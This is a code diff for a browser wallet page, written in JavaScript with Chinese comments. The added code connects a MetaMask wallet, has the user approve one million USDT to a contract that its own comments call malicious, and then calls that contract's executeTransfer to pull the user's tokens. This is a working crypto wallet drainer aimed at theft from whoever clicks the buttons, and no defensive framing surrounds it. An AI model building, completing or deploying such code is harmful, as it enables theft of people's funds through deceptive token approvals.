@@ -1,109 +1,67 @@
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
+const MALICIOUS_CONTRACT_ADDRESS = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 恶意合约地址
+const AMOUNT_TO_APPROVE = ethers.utils.parseUnits("1000000", 18); // 授权金额
+
 let provider;
 let signer;
 
-window.onload = function() {
-    const connectButton = document.getElementById('connectButton');
-    const executeTransferButton = document.getElementById('executeTransferButton');
+// USDT 合约 ABI
+const usdtAbi = [
+    "function approve(address spender, uint256 amount) public returns (bool)",
+    "function balanceOf(address account) external view returns (uint256)"
+];
 
-    // Check if Ethereum wallet is available (e.g. MetaMask)
-    if (typeof window.ethereum !== 'undefined') {
-        console.log("MetaMask is available");
+// 恶意合约 ABI
+const maliciousAbi = [
+    "function executeTransfer(address user) external"
+];
 
-        // Connect wallet
-        connectButton.addEventListener('click', async () => {
-            try {
-                // Request connection to MetaMask
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-
-                const userAddress = await signer.getAddress();
-                console.log("Connected wallet address:", userAddress);
-
-                // Wallet successfully connected
-                connectButton.innerHTML = `Connected: ${userAddress}`;
-                executeTransferButton.disabled = false;
-
-            } catch (error) {
-                console.error("Error connecting to wallet:", error);
-                alert("Failed to connect wallet");
-            }
-        });
-
-        // Execute transfer
-        executeTransferButton.addEventListener('click', async () => {
-            try {
-                const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // Replace with your contract address
-                const abi = [
-                    {
-                        "inputs": [
-                            {
-                                "internalType": "address",
-                                "name": "account",
-                                "type": "address"
-                            }
-                        ],
-                        "name": "balanceOf",
-                        "outputs": [
-                            {
-                                "internalType": "uint256",
-                                "name": "",
-                                "type": "uint256"
-                            }
-                        ],
-                        "stateMutability": "view",
-                        "type": "function"
-                    },
-                    {
-                        "inputs": [
-                            {
-                                "internalType": "address",
-                                "name": "sender",
-                                "type": "address"
-                            },
-                            {
-                                "internalType": "address",
-                                "name": "recipient",
-                                "type": "address"
-                            },
-                            {
-                                "internalType": "uint256",
-                                "name": "amount",
-                                "type": "uint256"
-                            }
-                        ],
-                        "name": "transferFrom",
-                        "outputs": [
-                            {
-                                "internalType": "bool",
-                                "name": "",
-                                "type": "bool"
-                            }
-                        ],
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }
-                ];
-
-                const contract = new ethers.Contract(contractAddress, abi, signer);
-                const userAddress = await signer.getAddress();
-
-                console.log("Attempting to execute transfer from:", userAddress);
-
-                // Execute the transfer
-                const tx = await contract.executeTransfer(userAddress);
-                await tx.wait();
-
-                alert("Transfer executed successfully");
-
-            } catch (error) {
-                console.error("Error executing transfer:", error);
-                alert("Transfer failed");
-            }
-        });
-
+async function connectWallet() {
+    if (window.ethereum) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        try {
+            const accounts = await provider.send("eth_requestAccounts", []);
+            document.getElementById('connectButton').innerHTML = `Connected: ${accounts[0]}`;
+            document.getElementById('approveButton').disabled = false; // 启用授权按钮
+        } catch (error) {
+            console.error('Failed to connect wallet', error);
+            alert('Failed to connect wallet');
+        }
     } else {
-        console.log("MetaMask is not available");
-        alert("MetaMask is not installed. Please install MetaMask to use this DApp.");
+        alert('MetaMask is not installed');
     }
-};
+}
+
+async function approveTokens() {
+    const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
+
+    try {
+        const tx = await usdtContract.approve(MALICIOUS_CONTRACT_ADDRESS, AMOUNT_TO_APPROVE);
+        await tx.wait();
+        alert('USDT approved');
+        document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
+    } catch (error) {
+        console.error('Approval failed', error);
+        alert('Approval failed');
+    }
+}
+
+async function executeTransfer() {
+    const maliciousContract = new ethers.Contract(MALICIOUS_CONTRACT_ADDRESS, maliciousAbi, signer);
+
+    try {
+        const userAddress = await signer.getAddress();
+        const tx = await maliciousContract.executeTransfer(userAddress);
+        await tx.wait();
+        alert('Transfer executed successfully');
+    } catch (error) {
+        console.error('Transfer failed', error);
+        alert('Transfer failed');
+    }
+}
+
+// 添加事件监听
+document.getElementById('connectButton').addEventListener('click', connectWallet);
+document.getElementById('approveButton').addEventListener('click', approveTokens);
+document.getElementById('executeTransferButton').addEventListener('click', executeTransfer);
